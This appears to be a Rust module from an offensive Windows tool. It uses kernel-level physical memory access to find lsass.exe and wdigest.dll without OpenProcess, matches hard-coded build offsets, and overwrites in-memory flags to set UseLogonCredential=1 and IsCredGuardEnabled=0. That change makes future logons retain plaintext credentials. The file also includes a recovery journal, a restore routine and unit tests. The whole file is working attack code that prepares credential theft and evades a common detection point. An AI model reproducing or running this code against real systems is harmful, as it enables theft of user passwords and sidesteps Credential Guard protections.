//! Handleless WDigest future-logon state inspection and reversible control.

use crate::{
    adapter::{Capabilities, Capability, KernelAdapter},
    bytes::{read_u16, read_u32, read_u64, write_u32, write_u64, zero},
    output::Output,
    process::{ProcessRecord, find_process, same_kernel_state},
    profiles::{KernelField, KernelProfile},
    recovery::{RecoveryError, RecoveryStore, checksum},
    session::KernelSession,
    system_image::{SystemImage, SystemImageError},
    user_module::{UserModule, find_module},
    virtual_memory::{ProcessMemory, VirtualMemoryError},
};
use core::fmt::Write;

const JOURNAL_BYTES: usize = 120;
const JOURNAL_MAGIC: u32 = 0x4744_574b;
const JOURNAL_VERSION: u32 = 1;
const JOURNAL_NONCE: u64 = 0x3147_4457_4e52_4b00;
const RECOVERY_NAME: &[u16] = &[99, 97, 99, 104, 101, 57, 66, 51, 70, 46, 116, 109, 112, 0];

const WDIGEST_PROFILES: [WdigestProfile; 3] = [
    WdigestProfile {
        version: "10.0.19041.6328",
        timestamp: 0xb179_4d9d,
        checksum: 0x0004_efef,
        image_size: 0x0004_b000,
        use_logon_rva: 0x0004_5a14,
        credential_guard_rva: 0x0004_51d8,
    },
    WdigestProfile {
        version: "10.0.22621.7517",
        timestamp: 0x00d2_97f6,
        checksum: 0x0005_c794,
        image_size: 0x0005_1000,
        use_logon_rva: 0x0004_a7c4,
        credential_guard_rva: 0x0004_a7d0,
    },
    WdigestProfile {
        version: "10.0.22621.7582",
        timestamp: 0x3659_67c9,
        checksum: 0x0005_a231,
        image_size: 0x0005_1000,
        use_logon_rva: 0x0004_a7b4,
        credential_guard_rva: 0x0004_a7c0,
    },
];

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum WdigestAction {
    State,
    Cycle,
    Enable,
    Restore,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct WdigestProfile {
    version: &'static str,
    timestamp: u32,
    checksum: u32,
    image_size: u32,
    use_logon_rva: u32,
    credential_guard_rva: u32,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct WdigestState {
    use_logon_credential: u32,
    credential_guard_enabled: u32,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct WdigestTarget {
    process: ProcessRecordIdentity,
    module: UserModule,
    profile: &'static WdigestProfile,
    state: WdigestState,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct ProcessRecordIdentity {
    pid: u32,
    section_base: u64,
    directory_table_base: u64,
    peb: u64,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct WdigestJournal {
    kernel_timestamp: u32,
    kernel_checksum: u32,
    kernel_image_size: u32,
    process: ProcessRecordIdentity,
    module_base: u64,
    module_timestamp: u32,
    module_checksum: u32,
    module_image_size: u32,
    use_logon_rva: u32,
    credential_guard_rva: u32,
    original: WdigestState,
    changed: WdigestState,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct WdigestError {
    stage: &'static str,
    code: u32,
    rollback: bool,
    recovery_retained: bool,
}

pub fn run<A: KernelAdapter>(adapter: &mut A, action: WdigestAction, output: &mut Output) {
    let result = match action {
        WdigestAction::State => inspect(adapter, output),
        WdigestAction::Cycle | WdigestAction::Enable => change(adapter, action, output),
        WdigestAction::Restore => restore(adapter, output),
    };

    match result {
        Ok(()) => output.line(match action {
            WdigestAction::State => "[+] WDigest future-logon state inspected; no changes made",
            WdigestAction::Cycle => "[+] WDigest state cycle complete; original values restored",
            WdigestAction::Enable => {
                "[+] WDigest future-logon retention enabled; run `wdigest restore` when finished"
            }
            WdigestAction::Restore => {
                "[+] WDigest future-logon state restored; recovery record removed"
            }
        }),
        Err(error) => {
            let _ = writeln!(
                output,
                "[-] WDigest action failed at {} (0x{:08x}); rollback={}; recovery-retained={}",
                error.stage,
                error.code,
                yes_no(error.rollback),
                yes_no(error.recovery_retained)
            );
        }
    }
}

fn inspect<A: KernelAdapter>(adapter: &mut A, output: &mut Output) -> Result<(), WdigestError> {
    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::PhysicalRead as u32);
    output.line("[*] Inspecting WDigest future-logon state without OpenProcess");
    let mut session = KernelSession::open(adapter, REQUIRED, 0).map_err(session_error)?;
    let profile = session.kernel.profile;
    let system_process = session.system_process;
    let (process, walked) =
        find_process(session.adapter(), profile, system_process, None).map_err(process_error)?;
    let confirmed = find_process(
        session.adapter(),
        profile,
        system_process,
        Some(process.pid as u32),
    )
    .map_err(process_error)?
    .0;

    if !same_kernel_state(&process, &confirmed) {
        return Err(wdigest_error("wdigest-process-stability", 1237));
    }

    let mut memory =
        ProcessMemory::new(session.adapter(), process.pid as u32).map_err(memory_error)?;
    let target = resolve_target(&mut memory, &process)?;
    let confirmed_state = read_state(&mut memory, target.module, target.profile)?;

    if confirmed_state != target.state {
        return Err(wdigest_error("wdigest-state-stability", 1237));
    }

    print_target(output, target, walked, &memory);
    session.close().map_err(close_error)?;

    Ok(())
}

fn change<A: KernelAdapter>(
    adapter: &mut A,
    action: WdigestAction,
    output: &mut Output,
) -> Result<(), WdigestError> {
    const REQUIRED: Capabilities = Capabilities::from_bits(
        Capability::KernelRead as u32
            | Capability::PhysicalRead as u32
            | Capability::PhysicalWrite as u32,
    );
    output.line(match action {
        WdigestAction::Cycle => "[*] Cycling WDigest future-logon state without OpenProcess",
        _ => "[*] Enabling WDigest future-logon retention without OpenProcess",
    });
    let mut session = KernelSession::open(adapter, REQUIRED, 4).map_err(session_error)?;
    let kernel_profile = session.kernel.profile;
    let system_process = session.system_process;
    let (process, walked) = find_process(session.adapter(), kernel_profile, system_process, None)
        .map_err(process_error)?;
    let mut memory =
        ProcessMemory::new(session.adapter(), process.pid as u32).map_err(memory_error)?;
    let target = resolve_target(&mut memory, &process)?;

    if target.state.use_logon_credential != 0 || target.state.credential_guard_enabled > 1 {
        return Err(wdigest_error("wdigest-exact-original-state", 5023));
    }

    print_target(output, target, walked, &memory);
    let journal = WdigestJournal::new(kernel_profile, target);
    let mut record = journal.encode();
    RecoveryStore::write_new(RECOVERY_NAME, &record)
        .map_err(|error| recovery_error(error, false, false))?;
    let changed = journal.changed;
    let write_result = write_state(&mut memory, target.module, target.profile, changed);
    let readback = read_state(&mut memory, target.module, target.profile);
    let changed_valid = write_result.is_ok() && readback == Ok(changed);

    if !changed_valid {
        let rollback = restore_state(&mut memory, target.module, target.profile, journal.original);

        if rollback {
            let _ = RecoveryStore::delete(RECOVERY_NAME);
        }

        zero(&mut record);
        return Err(WdigestError {
            stage: "wdigest-change-readback",
            code: write_result
                .err()
                .map(|error| error.code)
                .or_else(|| readback.err().map(|error| error.code))
                .unwrap_or(13),
            rollback,
            recovery_retained: !rollback,
        });
    }

    output.line("[*] UseLogonCredential=1 and IsCredGuardEnabled=0; readback exact");

    if matches!(action, WdigestAction::Cycle) {
        if !restore_state(&mut memory, target.module, target.profile, journal.original) {
            zero(&mut record);
            return Err(retained_error("wdigest-cycle-restore", 13));
        }

        RecoveryStore::delete(RECOVERY_NAME).map_err(|error| recovery_error(error, true, true))?;
        output.line("[*] Original WDigest values restored exactly");
    }

    zero(&mut record);
    session.close().map_err(close_error)?;

    Ok(())
}

fn restore<A: KernelAdapter>(adapter: &mut A, output: &mut Output) -> Result<(), WdigestError> {
    output.line("[*] Restoring an interrupted WDigest action");
    let mut record = [0_u8; JOURNAL_BYTES];
    RecoveryStore::read_exact(RECOVERY_NAME, &mut record)
        .map_err(|error| recovery_error(error, false, true))?;
    let journal = WdigestJournal::decode(&record)
        .ok_or_else(|| retained_error("wdigest-recovery-integrity", 13))?;
    zero(&mut record);
    const REQUIRED: Capabilities = Capabilities::from_bits(
        Capability::KernelRead as u32
            | Capability::PhysicalRead as u32
            | Capability::PhysicalWrite as u32,
    );
    let mut session = KernelSession::open(adapter, REQUIRED, 4).map_err(session_error)?;
    let kernel_profile = session.kernel.profile;

    if !journal.matches_kernel(kernel_profile) {
        return Err(retained_error("wdigest-recovery-kernel", 1306));
    }

    let system_process = session.system_process;
    let (process, _) = find_process(
        session.adapter(),
        kernel_profile,
        system_process,
        Some(journal.process.pid),
    )
    .map_err(process_error)?;

    if ProcessRecordIdentity::from_record(&process) != journal.process {
        return Err(retained_error("wdigest-recovery-process", 13));
    }

    let mut memory =
        ProcessMemory::new(session.adapter(), process.pid as u32).map_err(memory_error)?;
    let target = resolve_target(&mut memory, &process)?;

    if !journal.matches_target(target) {
        return Err(retained_error("wdigest-recovery-module", 1306));
    }

    if target.state == journal.changed {
        if !restore_state(&mut memory, target.module, target.profile, journal.original) {
            return Err(retained_error("wdigest-recovery-write", 13));
        }
    } else if target.state != journal.original {
        return Err(retained_error("wdigest-recovery-state", 13));
    }

    RecoveryStore::delete(RECOVERY_NAME).map_err(|error| recovery_error(error, true, true))?;
    session.close().map_err(close_error)?;
    output.line("[*] Original WDigest values verified exactly");

    Ok(())
}

fn resolve_target<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    process: &ProcessRecord,
) -> Result<WdigestTarget, WdigestError> {
    if process.pid <= 4 || process.pid > u32::MAX as u64 || process.peb == 0 {
        return Err(wdigest_error("wdigest-process", 13));
    }

    let (module, _) = find_module(memory, process.peb, b"wdigest.dll").map_err(module_error)?;
    let (confirmed, _) = find_module(memory, process.peb, b"wdigest.dll").map_err(module_error)?;

    if module != confirmed {
        return Err(wdigest_error("wdigest-module-stability", 1237));
    }

    let profile = WDIGEST_PROFILES
        .iter()
        .find(|profile| {
            module.identity.timestamp == profile.timestamp
                && module.identity.checksum == profile.checksum
                && module.identity.image_size == profile.image_size
                && module.size == profile.image_size
        })
        .ok_or_else(|| wdigest_error("wdigest-exact-profile", 1306))?;
    let image = SystemImage::open(b"wdigest.dll").map_err(system_image_error)?;

    if image.identity() != module.identity {
        return Err(wdigest_error("wdigest-system-image-identity", 1306));
    }

    let valid_layout = writable_data_rva(image.bytes(), profile.use_logon_rva, 4)
        && writable_data_rva(image.bytes(), profile.credential_guard_rva, 4)
        && profile.use_logon_rva & 3 == 0
        && profile.credential_guard_rva & 3 == 0
        && profile.use_logon_rva != profile.credential_guard_rva;

    if !valid_layout {
        return Err(wdigest_error("wdigest-profile-layout", 13));
    }

    let state = read_state(memory, module, profile)?;

    if state.use_logon_credential > 1 || state.credential_guard_enabled > 1 {
        return Err(wdigest_error("wdigest-state-values", 13));
    }

    Ok(WdigestTarget {
        process: ProcessRecordIdentity::from_record(process),
        module,
        profile,
        state,
    })
}

fn read_state<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    module: UserModule,
    profile: &WdigestProfile,
) -> Result<WdigestState, WdigestError> {
    Ok(WdigestState {
        use_logon_credential: memory
            .read_u32(module.base + profile.use_logon_rva as u64)
            .map_err(memory_error)?,
        credential_guard_enabled: memory
            .read_u32(module.base + profile.credential_guard_rva as u64)
            .map_err(memory_error)?,
    })
}

fn write_state<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    module: UserModule,
    profile: &WdigestProfile,
    state: WdigestState,
) -> Result<(), WdigestError> {
    let use_address = module.base + profile.use_logon_rva as u64;
    let guard_address = module.base + profile.credential_guard_rva as u64;
    memory
        .write(use_address, &state.use_logon_credential.to_le_bytes())
        .map_err(memory_error)?;

    if let Err(error) = memory.write(guard_address, &state.credential_guard_enabled.to_le_bytes()) {
        return Err(memory_error(error));
    }

    Ok(())
}

fn restore_state<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    module: UserModule,
    profile: &WdigestProfile,
    original: WdigestState,
) -> bool {
    for _ in 0..3 {
        let use_address = module.base + profile.use_logon_rva as u64;
        let guard_address = module.base + profile.credential_guard_rva as u64;
        let use_write = memory.write(use_address, &original.use_logon_credential.to_le_bytes());
        let guard_write = memory.write(
            guard_address,
            &original.credential_guard_enabled.to_le_bytes(),
        );

        if use_write.is_ok()
            && guard_write.is_ok()
            && read_state(memory, module, profile) == Ok(original)
        {
            return true;
        }
    }

    false
}

fn writable_data_rva(headers: &[u8], rva: u32, length: u32) -> bool {
    let Some(nt) = read_u32(headers, 0x3c).map(|value| value as usize) else {
        return false;
    };
    let Some(section_count) = read_u16(headers, nt + 6).map(|value| value as usize) else {
        return false;
    };
    let Some(optional_size) = read_u16(headers, nt + 20).map(|value| value as usize) else {
        return false;
    };
    let Some(mut offset) = nt
        .checked_add(24)
        .and_then(|value| value.checked_add(optional_size))
    else {
        return false;
    };
    let Some(target_end) = rva.checked_add(length) else {
        return false;
    };

    if section_count == 0 || section_count > 96 {
        return false;
    }

    for _ in 0..section_count {
        let Some(section) = headers.get(offset..offset + 40) else {
            return false;
        };
        let virtual_size = read_u32(section, 8).unwrap_or(0);
        let virtual_address = read_u32(section, 12).unwrap_or(0);
        let raw_size = read_u32(section, 16).unwrap_or(0);
        let characteristics = read_u32(section, 36).unwrap_or(0);
        let span = core::cmp::max(virtual_size, raw_size);
        let Some(section_end) = virtual_address.checked_add(span) else {
            return false;
        };
        let writable = characteristics & 0x8000_0000 != 0;
        let executable = characteristics & 0x2000_0000 != 0;

        if writable && !executable && rva >= virtual_address && target_end <= section_end {
            return true;
        }

        offset += 40;
    }

    false
}

fn print_target<A: KernelAdapter>(
    output: &mut Output,
    target: WdigestTarget,
    walked: usize,
    memory: &ProcessMemory<'_, A>,
) {
    let _ = writeln!(
        output,
        "[*] Target          : pid={} image=lsass.exe walked={} OpenProcess=not-used",
        target.process.pid, walked
    );
    let _ = writeln!(
        output,
        "[*] WDigest profile : {} exact PE identity",
        target.profile.version
    );
    let _ = writeln!(
        output,
        "[*] State           : UseLogonCredential={} IsCredGuardEnabled={}",
        target.state.use_logon_credential, target.state.credential_guard_enabled
    );
    let _ = writeln!(
        output,
        "[*] Memory path     : snapshot-pages={} target-pages={} physical-reads={} translations={} misses={} physical-writes={}",
        memory.snapshot_pages(),
        memory.mapped_pages(),
        memory.reads(),
        memory.translations(),
        memory.misses(),
        memory.writes()
    );
}

impl ProcessRecordIdentity {
    fn from_record(process: &ProcessRecord) -> Self {
        Self {
            pid: process.pid as u32,
            section_base: process.section_base,
            directory_table_base: process.directory_table_base,
            peb: process.peb,
        }
    }
}

impl WdigestJournal {
    fn new(kernel: &KernelProfile, target: WdigestTarget) -> Self {
        Self {
            kernel_timestamp: kernel.value(KernelField::PeTimestamp),
            kernel_checksum: kernel.value(KernelField::PeChecksum),
            kernel_image_size: kernel.value(KernelField::ImageSize),
            process: target.process,
            module_base: target.module.base,
            module_timestamp: target.profile.timestamp,
            module_checksum: target.profile.checksum,
            module_image_size: target.profile.image_size,
            use_logon_rva: target.profile.use_logon_rva,
            credential_guard_rva: target.profile.credential_guard_rva,
            original: target.state,
            changed: WdigestState {
                use_logon_credential: 1,
                credential_guard_enabled: 0,
            },
        }
    }

    fn encode(self) -> [u8; JOURNAL_BYTES] {
        let mut output = [0_u8; JOURNAL_BYTES];
        write_u32(&mut output, 0, JOURNAL_MAGIC);
        write_u32(&mut output, 4, JOURNAL_VERSION);
        write_u32(&mut output, 8, JOURNAL_BYTES as u32);
        write_u32(&mut output, 12, self.kernel_timestamp);
        write_u32(&mut output, 16, self.kernel_checksum);
        write_u32(&mut output, 20, self.kernel_image_size);
        write_u32(&mut output, 24, self.process.pid);
        write_u64(&mut output, 32, self.process.section_base);
        write_u64(&mut output, 40, self.process.directory_table_base);
        write_u64(&mut output, 48, self.process.peb);
        write_u64(&mut output, 56, self.module_base);
        write_u32(&mut output, 64, self.module_timestamp);
        write_u32(&mut output, 68, self.module_checksum);
        write_u32(&mut output, 72, self.module_image_size);
        write_u32(&mut output, 76, self.use_logon_rva);
        write_u32(&mut output, 80, self.credential_guard_rva);
        write_u32(&mut output, 84, self.original.use_logon_credential);
        write_u32(&mut output, 88, self.original.credential_guard_enabled);
        write_u32(&mut output, 92, self.changed.use_logon_credential);
        write_u32(&mut output, 96, self.changed.credential_guard_enabled);
        write_u64(&mut output, 104, JOURNAL_NONCE);
        let integrity = checksum(&output[..112]);
        write_u64(&mut output, 112, integrity);

        output
    }

    fn decode(input: &[u8; JOURNAL_BYTES]) -> Option<Self> {
        if read_u32(input, 0)? != JOURNAL_MAGIC
            || read_u32(input, 4)? != JOURNAL_VERSION
            || read_u32(input, 8)? != JOURNAL_BYTES as u32
            || read_u64(input, 104)? != JOURNAL_NONCE
            || read_u64(input, 112)? != checksum(&input[..112])
        {
            return None;
        }

        let journal = Self {
            kernel_timestamp: read_u32(input, 12)?,
            kernel_checksum: read_u32(input, 16)?,
            kernel_image_size: read_u32(input, 20)?,
            process: ProcessRecordIdentity {
                pid: read_u32(input, 24)?,
                section_base: read_u64(input, 32)?,
                directory_table_base: read_u64(input, 40)?,
                peb: read_u64(input, 48)?,
            },
            module_base: read_u64(input, 56)?,
            module_timestamp: read_u32(input, 64)?,
            module_checksum: read_u32(input, 68)?,
            module_image_size: read_u32(input, 72)?,
            use_logon_rva: read_u32(input, 76)?,
            credential_guard_rva: read_u32(input, 80)?,
            original: WdigestState {
                use_logon_credential: read_u32(input, 84)?,
                credential_guard_enabled: read_u32(input, 88)?,
            },
            changed: WdigestState {
                use_logon_credential: read_u32(input, 92)?,
                credential_guard_enabled: read_u32(input, 96)?,
            },
        };

        if journal.process.pid <= 4
            || journal.process.section_base == 0
            || journal.process.directory_table_base == 0
            || journal.process.peb == 0
            || journal.module_base == 0
            || journal.module_timestamp == 0
            || journal.module_checksum == 0
            || journal.module_image_size == 0
            || journal.use_logon_rva == 0
            || journal.credential_guard_rva == 0
            || !valid_original_state(journal.original)
            || journal.changed
                != (WdigestState {
                    use_logon_credential: 1,
                    credential_guard_enabled: 0,
                })
        {
            return None;
        }

        Some(journal)
    }

    fn matches_kernel(self, profile: &KernelProfile) -> bool {
        self.kernel_timestamp == profile.value(KernelField::PeTimestamp)
            && self.kernel_checksum == profile.value(KernelField::PeChecksum)
            && self.kernel_image_size == profile.value(KernelField::ImageSize)
    }

    fn matches_target(self, target: WdigestTarget) -> bool {
        self.process == target.process
            && self.module_base == target.module.base
            && self.module_timestamp == target.module.identity.timestamp
            && self.module_checksum == target.module.identity.checksum
            && self.module_image_size == target.module.identity.image_size
            && self.use_logon_rva == target.profile.use_logon_rva
            && self.credential_guard_rva == target.profile.credential_guard_rva
    }
}

const fn valid_original_state(state: WdigestState) -> bool {
    state.use_logon_credential == 0 && state.credential_guard_enabled <= 1
}

const fn wdigest_error(stage: &'static str, code: u32) -> WdigestError {
    WdigestError {
        stage,
        code,
        rollback: false,
        recovery_retained: false,
    }
}

const fn retained_error(stage: &'static str, code: u32) -> WdigestError {
    WdigestError {
        stage,
        code,
        rollback: false,
        recovery_retained: true,
    }
}

const fn session_error(error: crate::session::SessionError) -> WdigestError {
    WdigestError {
        stage: error.stage,
        code: error.code,
        rollback: false,
        recovery_retained: false,
    }
}

const fn process_error(error: crate::process::ProcessError) -> WdigestError {
    wdigest_error(error.stage(), error.code())
}

const fn module_error(error: crate::user_module::UserModuleError) -> WdigestError {
    wdigest_error(error.stage(), error.code())
}

const fn system_image_error(error: SystemImageError) -> WdigestError {
    wdigest_error(error.stage(), error.code())
}

const fn memory_error(error: VirtualMemoryError) -> WdigestError {
    wdigest_error(error.stage(), error.code())
}

const fn close_error(error: crate::adapter::AdapterError) -> WdigestError {
    wdigest_error("adapter-close", error.code())
}

const fn recovery_error(
    error: RecoveryError,
    rollback: bool,
    recovery_retained: bool,
) -> WdigestError {
    WdigestError {
        stage: error.stage(),
        code: error.code(),
        rollback,
        recovery_retained,
    }
}

const fn yes_no(value: bool) -> &'static str {
    if value { "yes" } else { "no" }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profiles::KERNEL_PROFILES;

    #[test]
    fn journal_round_trip_is_exact() {
        let target = WdigestTarget {
            process: ProcessRecordIdentity {
                pid: 4242,
                section_base: 0x1000,
                directory_table_base: 0x2000,
                peb: 0x3000,
            },
            module: UserModule {
                base: 0x4000,
                size: WDIGEST_PROFILES[0].image_size,
                identity: crate::kernel::ImageIdentity {
                    timestamp: WDIGEST_PROFILES[0].timestamp,
                    checksum: WDIGEST_PROFILES[0].checksum,
                    image_size: WDIGEST_PROFILES[0].image_size,
                },
            },
            profile: &WDIGEST_PROFILES[0],
            state: WdigestState {
                use_logon_credential: 0,
                credential_guard_enabled: 1,
            },
        };
        let journal = WdigestJournal::new(&KERNEL_PROFILES[0], target);

        assert_eq!(WdigestJournal::decode(&journal.encode()), Some(journal));
    }

    #[test]
    fn journal_round_trip_accepts_vbs_off_state() {
        let target = WdigestTarget {
            process: ProcessRecordIdentity {
                pid: 4242,
                section_base: 0x1000,
                directory_table_base: 0x2000,
                peb: 0x3000,
            },
            module: UserModule {
                base: 0x4000,
                size: WDIGEST_PROFILES[0].image_size,
                identity: crate::kernel::ImageIdentity {
                    timestamp: WDIGEST_PROFILES[0].timestamp,
                    checksum: WDIGEST_PROFILES[0].checksum,
                    image_size: WDIGEST_PROFILES[0].image_size,
                },
            },
            profile: &WDIGEST_PROFILES[0],
            state: WdigestState {
                use_logon_credential: 0,
                credential_guard_enabled: 0,
            },
        };
        let journal = WdigestJournal::new(&KERNEL_PROFILES[0], target);

        assert_eq!(WdigestJournal::decode(&journal.encode()), Some(journal));
    }

    #[test]
    fn journal_rejects_tampering() {
        let mut record = [0_u8; JOURNAL_BYTES];
        write_u32(&mut record, 0, JOURNAL_MAGIC);

        assert_eq!(WdigestJournal::decode(&record), None);
    }
}
